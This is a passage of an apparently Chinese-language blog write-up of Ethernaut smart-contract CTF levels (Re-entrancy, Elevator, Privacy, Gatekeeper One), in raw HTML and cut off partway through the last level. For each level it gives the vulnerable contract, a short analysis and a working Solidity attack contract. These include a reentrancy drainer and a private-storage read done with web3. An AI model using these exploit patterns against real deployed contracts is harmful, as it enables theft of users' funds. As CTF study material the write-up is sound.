punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-9\"><a href=\"#Analyze-9\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>经典的重入漏洞，使用了call转账，并且balances[msg.sender]在转账完成之后才进行更新，所以攻击合约中的fallback可以进行重入</p>\n<h2 id=\"Attack-9\"><a href=\"#Attack-9\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    test <span class=\"token keyword\">constant</span> <span class=\"token keyword\">private</span> target<span class=\"token operator\">=</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">cunqian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span>donate<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">tuiqian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token operator\">>=</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">reuse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//回收再利用，勤俭节约</span>\n    <span class=\"token comment\">//function destroy(address payable addr)public payable&#123;</span>\n    <span class=\"token comment\">//    selfdestruct(addr);</span>\n    <span class=\"token comment\">//&#125;自毁转账法，和reuse()用途一样，回收代币(其中addr是钱包地址)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"11-Elevator\"><a href=\"#11-Elevator\" class=\"headerlink\" title=\"11.Elevator\"></a>11.Elevator</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：电梯不会让你达到大楼顶部, 对吧?使top变成true</p></blockquote>\n<h2 id=\"Code-10\"><a href=\"#Code-10\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Building</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Elevator</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> top<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> floor<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _floor<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    Building building <span class=\"token operator\">=</span> <span class=\"token function\">Building</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span> building<span class=\"token punctuation\">.</span><span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span>_floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      floor <span class=\"token operator\">=</span> _floor<span class=\"token punctuation\">;</span>\n      top <span class=\"token operator\">=</span> building<span class=\"token punctuation\">.</span><span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span>floor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-10\"><a href=\"#Analyze-10\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>在这个if语句中进行了两次building.isLastFloor(_floor)调用，所以要先将builiding变成攻击合约，然后第一次调用传入false第二次传入true即可</p>\n<h2 id=\"Attack-10\"><a href=\"#Attack-10\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> i<span class=\"token operator\">=</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isLastFloor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        i<span class=\"token operator\">=</span><span class=\"token operator\">!</span>i<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> i<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//两次调用，if判断时传入false，更改top时传入true</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">a</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> fllor<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        Elevator target<span class=\"token operator\">=</span><span class=\"token function\">Elevator</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xDA0bab807633f07f013f94DD0E6A4F96F8742B53</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//设置被攻击合约地址</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">goTo</span><span class=\"token punctuation\">(</span>fllor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//让题目中的调用地址变为攻击合约</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"12-Privacy\"><a href=\"#12-Privacy\" class=\"headerlink\" title=\"12.Privacy\"></a>12.Privacy</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.</p>\n<p>Things that might help:</p>\n<ul>\n<li>Understanding how storage works</li>\n<li>Understanding how parameter parsing works</li>\n<li>Understanding how casting works</li>\n</ul>\n<p>Tips:</p>\n<ul>\n<li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>\n</ul></blockquote>\n<h2 id=\"Code-11\"><a href=\"#Code-11\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Privacy</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> ID <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint8</span> <span class=\"token keyword\">private</span> flattening <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint8</span> <span class=\"token keyword\">private</span> denomination <span class=\"token operator\">=</span> <span class=\"token number\">255</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint16</span> <span class=\"token keyword\">private</span> awkwardness <span class=\"token operator\">=</span> <span class=\"token builtin\">uint16</span><span class=\"token punctuation\">(</span>now<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">private</span> data<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> _data<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    data <span class=\"token operator\">=</span> _data<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  \n  <span class=\"token keyword\">function</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes16</span> _key<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>_key <span class=\"token operator\">==</span> <span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//data[2]为bytes32[2]，所以我们要获得private的bytes32</span>\n\n  <span class=\"token comment\">/*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`\n      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\n  */</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-11\"><a href=\"#Analyze-11\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p><strong><a href=\"https://xz.aliyun.com/t/9837#toc-7\">存储机制学习①</a></strong></p>\n<p><strong><a href=\"https://blog.csdn.net/rfrder/article/details/115706983\">存储机制学习②</a></strong></p>\n<p><strong><a href=\"https://blog.csdn.net/Blockchain_lemon/article/details/82836002\">存储机制学习③</a></strong></p>\n<p><strong><a href=\"https://www.jianshu.com/p/f01a5790e8cb\">存储机制学习④</a></strong></p>\n<p><strong>相对做vault那道题时深入研究了一下存储方式的问题：根据 solidity 文档中的变量存储原则，evm 每一次处理 32 个字节，而不足 32 字节的变量相互共享并补齐 32 字节。(bool占1字节但是独占一个插槽，uint256和bytes32占32字节，uint8,16,根据比例可计算分别占据1，2字节)</strong></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/bcYng-w/images/img/202204281244876.png\">)</p>\n<p><strong>变量查询代码</strong></p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> web3 <span class=\"token keyword\">import</span> Web3<span class=\"token punctuation\">,</span>HTTPProvider\n<span class=\"token keyword\">import</span> json<span class=\"token punctuation\">,</span>binascii\nhttp <span class=\"token operator\">=</span> <span class=\"token string\">'https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab'</span>\nweb3 <span class=\"token operator\">=</span> Web3<span class=\"token punctuation\">(</span>HTTPProvider<span class=\"token punctuation\">(</span>http<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>b2a_hex<span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x1203d029Db225601f986253526D1a8bD662782A6\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"0\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>binascii<span class=\"token punctuation\">.</span>b2a_hex<span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span><span class=\"token string\">\"0x1203d029Db225601f986253526D1a8bD662782A6\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"5\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>题目中要求传入bytes16数据，将所得的bytes32转变成为bytes16，用到以下合约</p>\n<h2 id=\"Attack-11\"><a href=\"#Attack-11\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n     Privacy target<span class=\"token operator\">=</span><span class=\"token function\">Privacy</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x1203d029Db225601f986253526D1a8bD662782A6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token builtin\">bytes16</span> <span class=\"token keyword\">public</span> result<span class=\"token punctuation\">;</span> \n   <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> trans<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n       result<span class=\"token operator\">=</span><span class=\"token builtin\">bytes16</span><span class=\"token punctuation\">(</span>trans<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">pwn</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes16</span> key<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n         target<span class=\"token punctuation\">.</span><span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n     <span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"13-Gatekeeper-One\"><a href=\"#13-Gatekeeper-One\" class=\"headerlink\" title=\"13.Gatekeeper One\"></a>13.Gatekeeper One</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：Make it past the gatekeeper and register as an entrant to pass this level.</p>\n<p>Things that might help:</p>\n<ul>\n<li>Remember what you’ve learned from the Telephone and Token levels.</li>\n<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a href=\"https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html\">here</a> and <a href=\"https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls\">here</a>).</li>\n</ul></blockquote>\n<h2 id=\"Code-12\"><a href=\"#Code-12\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GatekeeperOne</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> entrant<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">!=</span> tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token comment\">//使用合约进行攻击时tx.origin为钱包账户地址，msg.sender为攻击合约地址，part one即可绕过</span>\n\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">gateTwo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">gasleft</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mod</span><span class=\"token punctuation\">(</span><span class=\"token number\">8191</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token 